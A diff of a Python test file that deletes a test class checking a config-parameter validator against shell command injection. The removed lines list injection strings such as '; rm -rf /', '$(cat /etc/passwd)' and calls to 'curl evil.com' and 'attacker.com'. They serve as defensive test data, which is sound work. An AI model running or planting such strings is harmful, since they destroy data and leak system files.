@@ -5,8 +5,6 @@ from shared.validation import (
     EXECUTABLE_EMPTY_ERROR,
     EXECUTABLE_INVALID_CHARS_ERROR,
     EXECUTABLE_PARENT_DIR_ERROR,
-    SHELL_METACHARACTERS,
-    validate_config_params,
     validate_name,
 )
 
@@ -108,79 +106,3 @@ class TestValidateName:
             errors = validate_name(name)
             assert errors, f"Expected '{name}' to be invalid"
             assert EXECUTABLE_INVALID_CHARS_ERROR in errors
-
-
-class TestValidateConfigParams:
-    """Test cases for validate_config_params function."""
-
-    def test_valid_config_params(self) -> None:
-        """Test that valid config parameters pass validation."""
-        valid_params = [
-            "--input file.raw --output dir",
-            "--qvalue 0.01 --f RAW_FILE_PATH --out OUTPUT_PATH",
-            "--lib LIBRARY_PATH --fasta FASTA_PATH",
-            "--verbose --threads 8",
-            "/path/to/file.raw",
-            "--param=value",
-            "--param value with spaces",
-            "--option1 --option2",
-            "",  # Empty params should be allowed
-        ]
-
-        for params in valid_params:
-            errors = validate_config_params(params)
-            assert not errors, f"Expected '{params}' to be valid, got errors: {errors}"
-
-    def test_empty_config_params(self) -> None:
-        """Test that empty config params are allowed."""
-        errors = validate_config_params("")
-        assert not errors
-
-    def test_shell_metacharacters(self) -> None:
-        """Test that shell metacharacters fail validation."""
-        # Test each forbidden character individually
-        for char in SHELL_METACHARACTERS:
-            invalid_param = f"--option{char}value"
-            errors = validate_config_params(invalid_param)
-            assert errors, f"Expected parameter with '{char}' to be invalid"
-            assert "forbidden shell metacharacters" in errors[0]
-            assert char in errors[0]
-
-    def test_multiple_shell_metacharacters(self) -> None:
-        """Test that multiple shell metacharacters are all reported."""
-        invalid_param = "--input file.raw; rm -rf / && curl evil.com"
-        errors = validate_config_params(invalid_param)
-        assert errors
-        assert "forbidden shell metacharacters" in errors[0]
-        # Should contain the forbidden characters found
-        assert ";" in errors[0]
-        assert "&" in errors[0]
-
-    def test_common_injection_attempts(self) -> None:
-        """Test common command injection patterns."""
-        injection_attempts = [
-            "--input file.raw; rm -rf /",
-            "--output $(cat /etc/passwd)",
-            "--param `curl evil.com`",
-            "--input file.raw && malicious_command",
-            "--output dir | curl attacker.com",
-            "--param value; shutdown -h now",
-            "--input 'file.raw'",  # Single quotes
-            '--output "dir"',  # Double quotes
-            "--param value\\escape",
-            "--input file.raw > /dev/null",
-            "--param $(malicious)",
-            "--input file.raw < /etc/hosts",
-            "--param [dangerous]",
-            "--input {dangerous}",
-            "--param ~user/file",
-            "--input file.raw!",
-            "--param value*",
-            "--input file?.raw",
-            "; ./my_exe",
-        ]
-
-        for attempt in injection_attempts:
-            errors = validate_config_params(attempt)
-            assert errors, f"Expected injection attempt '{attempt}' to be blocked"
-            assert "forbidden shell metacharacters" in errors[0]
